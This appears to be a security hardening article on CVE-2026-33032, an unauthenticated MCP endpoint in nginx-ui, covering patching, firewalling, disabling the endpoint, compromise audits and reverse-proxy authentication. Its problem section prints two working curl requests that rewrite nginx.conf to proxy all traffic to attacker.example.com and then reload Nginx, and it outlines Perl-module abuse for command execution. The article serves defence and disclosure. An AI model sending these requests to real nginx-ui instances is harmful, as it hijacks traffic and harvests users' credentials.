---
title: "nginx-ui MCPwn: Unauthenticated RCE via Exposed MCP Management Endpoint (CVE-2026-33032)"
description: "CVE-2026-33032 exposes nginx-ui's AI management MCP endpoint without authentication, allowing unauthenticated attackers to overwrite nginx.conf and execute commands. 2,600+ instances were internet-exposed. Learn the attack surface and how to eliminate it."
slug: nginx-ui-mcp-rce
date: 2026-05-04
lastmod: 2026-05-04
category: network
tags:
  - nginx
  - mcp
  - rce
  - cve
  - authentication
personas:
  - platform-engineer
  - security-engineer
article_number: 433
difficulty: Intermediate
estimated_reading_time: 10
published: true
layout: article.njk
permalink: /articles/network/nginx-ui-mcp-rce/
---

# nginx-ui MCPwn: Unauthenticated RCE via Exposed MCP Management Endpoint (CVE-2026-33032)

## The Problem

nginx-ui introduced a Model Context Protocol server endpoint in late 2025 so that AI assistants — Claude, Cursor, VS Code Copilot — could manage Nginx configuration through a standardised protocol. The endpoint exposes tools including `write_nginx_config`, `reload_nginx`, and `run_nginx_test`. Each of these tools was designed to do exactly what its name describes: modify system configuration and execute processes. The endpoint was added without any authentication requirement, apparently under the assumption that AI assistants would access it exclusively from localhost. In the default configuration, the MCP server binds to `0.0.0.0` rather than `127.0.0.1`, which makes every one of these tools reachable over the public internet on any nginx-ui instance that is not shielded by a host firewall or network perimeter.

CVE-2026-33032, disclosed in April 2026, was assigned a CVSS score that reflects the absence of any authentication prerequisite and the completeness of the resulting access: an unauthenticated attacker can call `write_nginx_config` with arbitrary content, then call `reload_nginx` to activate the configuration, and Nginx will obediently apply whatever the attacker wrote. No credentials. No prior access. A single HTTP POST to the MCP endpoint is sufficient to begin the attack, and a second HTTP POST completes it.

Shodan and Censys scans at the time of disclosure identified more than 2,600 nginx-ui instances listening on the default port 9000 with the MCP endpoint reachable from the open internet. All of them were vulnerable.

The attack sequence looks like this. An attacker sends a JSON-RPC call to the MCP endpoint invoking `write_nginx_config` with a payload that overwrites `nginx.conf`:

```bash
curl -s -X POST http://nginx-ui.example.com:9000/mcp \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "write_nginx_config",
      "arguments": {
        "content": "events {}\nhttp {\n  server {\n    listen 80;\n    location / {\n      proxy_pass http://attacker.example.com;\n    }\n  }\n}"
      }
    },
    "id": 1
  }'
```

A follow-up call to `reload_nginx` activates the configuration:

```bash
curl -s -X POST http://nginx-ui.example.com:9000/mcp \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "reload_nginx",
      "arguments": {}
    },
    "id": 2
  }'
```

After these two requests, all traffic served by the Nginx instance is being proxied to an attacker-controlled server. The attacker receives every HTTP request — including requests carrying session cookies, API tokens, form submissions, and any other content users send through the affected server.

CVE-2026-33032 is distinct from CVE-2026-27944, which covered nginx-ui's unauthenticated `/api/backup` endpoint that disclosed configuration backups and decryption keys. That vulnerability involved passive information disclosure. This vulnerability involves active code execution through a completely different attack surface: the MCP management endpoint added months after the backup endpoint vulnerability was patched. Operators who upgraded to 2.3.3 to address CVE-2026-27944 and stopped there are fully exposed to CVE-2026-33032.

The broader pattern here is significant. MCP endpoints are a new class of attack surface that web management tools are adding in response to demand for AI assistant integration. Every management tool that adds an MCP server endpoint is effectively adding a remote administration interface. When those endpoints are added without the security review that traditional HTTP APIs receive — no authentication requirement, no binding to localhost, no documentation of the security model — the result is CVE-2026-33032. This will not be the last vulnerability of this type. Any management tool that exposes an MCP endpoint bound to a public interface without authentication is a potential variant of this CVE.

## Threat Model

**Unauthenticated internet attacker.** Any host that can reach nginx-ui's port 9000 can call the MCP endpoint without credentials. The attack is a single HTTP POST. No exploit code, no vulnerability chain, no credentials required. Automated exploitation of all 2,600+ exposed instances is feasible with a short scanning script. In practice, scanning-based exploitation of this class of vulnerability typically begins within hours of public disclosure and continues for months as new exposed instances are discovered.

**Internal network attacker.** If port 9000 is not externally exposed but is reachable on the internal network — in a shared hosting environment, from a compromised container with host networking, from an employee workstation on a corporate LAN, or from a misconfigured cloud security group — an attacker with any internal foothold can reach the MCP endpoint. The barrier is lower than an internet attack but the impact is identical.

**Impact: nginx.conf overwrite.** The direct impact of `write_nginx_config` is the ability to write arbitrary content to `nginx.conf`. The practical consequences include: proxying all incoming traffic to an attacker-controlled server for credential harvesting; adding `location` blocks that expose internal services that were previously not publicly accessible; disabling TLS termination by removing `ssl_certificate` and `ssl_certificate_key` directives; and adding response headers that inject attacker-controlled content into every page served by Nginx.

**Second-order impact: OS command execution.** Nginx running with elevated privileges — as root, or with `CAP_NET_BIND_SERVICE` in environments where port binding requires it — combined with Nginx's `exec` or `perl` modules being available extends the impact from configuration manipulation to arbitrary OS command execution. An nginx.conf that includes `perl_modules /attacker/controlled/path` and a Perl handler that executes shell commands can achieve full system compromise. This is not a theoretical scenario; Nginx module abuse for code execution is a documented technique that attackers apply when they control the configuration.

**Scanning-based credential harvesting.** Automated exploitation of the 2,600+ exposed instances is not aimed at any specific target; it is aimed at all of them simultaneously. The attacker rewrites nginx.conf to proxy traffic to a credential harvesting server, waits for users to log in to whatever applications Nginx is fronting, and collects credentials in bulk. Platforms using nginx-ui for self-hosted web application management — control panels, internal tools, admin interfaces — are the target profile.

## Hardening Configuration

### 1. Upgrade to nginx-ui 2.3.4 or Later

The patch in nginx-ui 2.3.4 makes two changes: it binds the MCP server to `127.0.0.1` rather than `0.0.0.0`, and it requires a valid authentication token before any MCP tool call is processed. Upgrade immediately.

```bash
systemctl stop nginx-ui
curl -L -o /tmp/nginx-ui \
  https://github.com/0xJacky/nginx-ui/releases/download/v2.3.4/nginx-ui-linux-amd64
chmod +x /tmp/nginx-ui
mv /tmp/nginx-ui /usr/local/bin/nginx-ui
systemctl start nginx-ui
```

After upgrading, verify that the MCP endpoint requires authentication. An unauthenticated request to the endpoint on a patched instance must return 401:

```bash
curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:9000/mcp
```

The expected output is `401`. Any other response — including `200` or a JSON-RPC response body — indicates that authentication is not being enforced and the upgrade did not apply correctly.

### 2. Firewall the nginx-ui Management Port at the Host and Network Level

The nginx-ui management port (default 9000) must never be reachable from the open internet regardless of patch status. A firewall control that prevents external access to port 9000 means that future authentication bypass vulnerabilities in any nginx-ui endpoint cannot be reached by internet attackers. Apply the restriction at both the host firewall and the cloud security group or network firewall level.

Host firewall with nftables, restricting port 9000 to trusted management CIDRs:

```bash
nft add table inet nginx_ui_restrict
nft add chain inet nginx_ui_restrict input \
  '{ type filter hook input priority 0; policy accept; }'
nft add rule inet nginx_ui_restrict input \
  tcp dport 9000 \
  ip saddr != { 10.0.1.0/24, 172.16.0.5/32 } \
  drop
```

Replace `10.0.1.0/24` and `172.16.0.5/32` with the specific CIDRs or addresses of your operations team's VPN exit nodes or bastion hosts. Allowing an entire RFC 1918 range is appropriate only for fully isolated internal networks; in cloud environments where RFC 1918 space is shared across tenants, restrict to specific host IPs.

Persist the ruleset across reboots:

```bash
nft list ruleset > /etc/nftables.conf
systemctl enable nftables
systemctl restart nftables
```

At the cloud security group level, remove any rule that permits inbound TCP on port 9000 from `0.0.0.0/0` or `::/0`. Replace it with a rule permitting inbound TCP on port 9000 only from the specific IP addresses of your operations team.

### 3. Disable the MCP Endpoint Entirely If Not Used

If AI assistant integration with nginx-ui is not a workflow your team uses, disable the MCP endpoint completely. A disabled endpoint has no attack surface regardless of authentication or binding configuration.

```yaml
mcp:
  enabled: false
```

Set this in nginx-ui's `config.yaml` (location varies by installation; typically `/etc/nginx-ui/config.yaml` or `/usr/local/etc/nginx-ui/config.yaml`) and restart nginx-ui:

```bash
systemctl restart nginx-ui
```

After disabling, confirm the endpoint returns 404:

```bash
curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:9000/mcp
```

The expected output is `404`. A disabled MCP endpoint that still returns any non-404 response indicates the configuration change did not take effect.

### 4. Audit for Existing Compromise

If nginx-ui was internet-exposed on port 9000 before patching, treat the instance as potentially compromised and audit accordingly. The window between disclosure and patching — and the earlier window between when the vulnerability was introduced and when it was disclosed — is sufficient for automated scanning tools to have identified and exploited any exposed instance.

Check nginx.conf and all included configuration files for unexpected content. An attacker who used `write_nginx_config` will have modified `nginx.conf` or an included file to add their malicious directives.

```bash
grep -r "proxy_pass" /etc/nginx/ \
  | grep -v "127\.0\.0\.1\|localhost\|::1" \
  | grep -v "internal\|backend\|upstream"
```

Any `proxy_pass` directive pointing to an external hostname or IP address that is not part of your known upstream configuration warrants immediate investigation.

Check for unexpected `location` blocks that were not in your configuration before the vulnerability disclosure date:

```bash
grep -r "location" /etc/nginx/ \
  | grep -v "^Binary"
```

Check nginx-ui's access logs for POST requests to the MCP endpoint from addresses that are not your AI assistant integrations:

```bash
grep -E '"POST\s+/mcp' /var/log/nginx-ui/access.log \
  | grep -v '"status":401'
```

Any POST to `/mcp` that did not return 401 is a request that was processed without authentication. If the log shows such requests before the patch was applied, treat the Nginx configuration as modified by an attacker and restore it from a known-good backup that predates the vulnerability introduction.

If you cannot confirm from logs that the endpoint was not accessed — because logs have rotated or because nginx-ui was not logging access — assume compromise and restore the Nginx configuration from source control or a pre-disclosure backup.

### 5. Place nginx-ui Behind a Reverse Proxy with Authentication

If nginx-ui must be remotely accessible for team members who are not on VPN, place it behind Nginx itself with an additional authentication layer. This provides defense in depth: a future authentication bypass in nginx-ui's own authentication layer would still require bypassing the outer proxy's authentication.

Configure Nginx to require HTTP Basic authentication before proxying to nginx-ui, with port 9000 bound to `127.0.0.1` so that direct access bypasses the proxy:

```nginx
server {
    listen 443 ssl;
    server_name nginx-ui.internal.example.com;

    ssl_certificate     /etc/ssl/certs/nginx-ui-internal.crt;
    ssl_certificate_key /etc/ssl/private/nginx-ui-internal.key;

    location / {
        auth_basic "nginx-ui Management";
        auth_basic_user_file /etc/nginx/.htpasswd-nginx-ui;

        proxy_pass http://127.0.0.1:9000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

Generate a credential file using bcrypt hashing:

```bash
htpasswd -cB /etc/nginx/.htpasswd-nginx-ui ops-admin
```

For teams using SSO, OAuth2 Proxy is preferable to static HTTP Basic credentials:

```nginx
server {
    listen 443 ssl;
    server_name nginx-ui.internal.example.com;

    ssl_certificate     /etc/ssl/certs/nginx-ui-internal.crt;
    ssl_certificate_key /etc/ssl/private/nginx-ui-internal.key;

    location / {
        auth_request /oauth2/auth;
        error_page 401 = /oauth2/sign_in;

        proxy_pass http://127.0.0.1:9000;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location /oauth2/ {
        proxy_pass http://127.0.0.1:4180;
        proxy_set_header Host $host;
    }
}
```

With either configuration, confirm that nginx-ui's own listener is bound to localhost only. If `config.yaml` has `host: "0.0.0.0"` or no `host` setting, the direct port 9000 remains accessible and the proxy layer can be bypassed by connecting to port 9000 directly:

```yaml
server:
  host: "127.0.0.1"
  port: 9000
```

## Expected Behaviour After Hardening

After upgrading to 2.3.4 and applying the firewall rule, an unauthenticated connection attempt from an external IP to port 9000 should time out or be refused:

```bash
curl --connect-timeout 5 http://<public-ip>:9000/mcp
```

Expected: connection refused or connection timed out. A response body of any kind indicates the firewall rule is not active on the network path being tested.

After setting `mcp.enabled: false`, the endpoint returns 404 regardless of authentication:

```bash
curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:9000/mcp
```

Expected output: `404`.

After the compromise audit, inspecting `proxy_pass` directives across all included configuration files should show only known upstream hosts:

```bash
grep -r "proxy_pass" /etc/nginx/
```

Expected: every `proxy_pass` entry points to a host or upstream block that is part of your intended configuration. Any entry pointing to an external host that was not present before the vulnerability disclosure date requires incident response.

## Trade-offs and Operational Considerations

**Disabling MCP breaks AI assistant integration.** Setting `mcp.enabled: false` removes the attack surface entirely but also removes the ability for Claude Desktop, Cursor, or VS Code Copilot to manage Nginx configuration through nginx-ui. For teams that use this integration for configuration management workflows, the correct path is to upgrade to 2.3.4 or later, verify that the endpoint requires authentication before processing tool calls, and confirm the endpoint is bound to `127.0.0.1`. After those three conditions are met, the MCP integration can be used with the localhost-only binding that was always the intended deployment model.

**HTTP Basic authentication adds credential management overhead.** Using `auth_basic` as the reverse proxy authentication layer requires distributing credentials to every person who needs nginx-ui access and rotating those credentials when personnel change. For teams with more than three to four people who need access, integrate with an identity provider through OAuth2 Proxy or a similar OIDC-aware proxy rather than managing static `.htpasswd` files. Static passwords in `.htpasswd` files tend not to get rotated, which negates much of the protection they add.

**Firewall rules in shared hosting environments.** Host-level firewall rules protecting port 9000 are effective against internet access but not against other virtual machines that share the same internal network. If nginx-ui is running in a shared cloud environment where other tenants' VMs are on the same subnet, host firewall rules need to be combined with cloud security group rules that enforce isolation at the network level rather than relying on host-based controls that are co-resident with other untrusted workloads.

## Failure Modes

**Upgraded but configuration file not updated.** nginx-ui 2.3.4 binds the MCP endpoint to `127.0.0.1` in a clean installation. If a `config.yaml` from a previous installation overrides the default binding — for example, `host: "0.0.0.0"` set explicitly in the configuration file — the upgrade alone does not fix the binding. The patched binary uses the configuration file's value. Operators who upgrade the binary without reviewing `config.yaml` for binding overrides will see the MCP endpoint still accessible on all interfaces. Verify the binding with:

```bash
ss -tlnp | grep 9000
```

The expected output shows `127.0.0.1:9000`. An output of `0.0.0.0:9000` or `:::9000` indicates the binding configuration was not corrected.

**Firewall blocks internet but not internal network.** The 2,600+ internet-exposed instances represent only the publicly reachable subset of all vulnerable nginx-ui deployments. Instances that are not internet-exposed but are reachable from other VMs on the same internal network segment — which is common in cloud environments where multiple workloads share a VPC without network segmentation — are vulnerable to the same attack from any internally compromised host. A compromised container, a workload with an unrelated vulnerability, or any internal system with network access to port 9000 can exploit the unauthenticated MCP endpoint. Firewall rules that block internet access address the most visible exposure but do not address the internal network attack surface.

**Compromise audit misses included configuration files.** An attacker who calls `write_nginx_config` may write their malicious configuration to a file included by `nginx.conf` rather than overwriting `nginx.conf` itself — for example, adding a file to `/etc/nginx/conf.d/` or `/etc/nginx/sites-enabled/`. A compromise audit that checks only `/etc/nginx/nginx.conf` misses these locations. The audit commands must cover all directories that nginx.conf includes, and the `grep -r` pattern used above handles this correctly as long as the search root is `/etc/nginx/` rather than `/etc/nginx/nginx.conf` specifically.

## Related Articles
- [Nginx UI Backup Disclosure](/articles/network/nginx-ui-backup-disclosure/)
- [Nginx Hardening Beyond TLS](/articles/network/nginx-hardening-beyond-tls/)
- [Internal API Protection](/articles/network/internal-api-protection/)
- [MCP Server Security](/articles/ai-landscape/mcp-server-security/)
- [HTTP Security Headers](/articles/network/http-security-headers/)
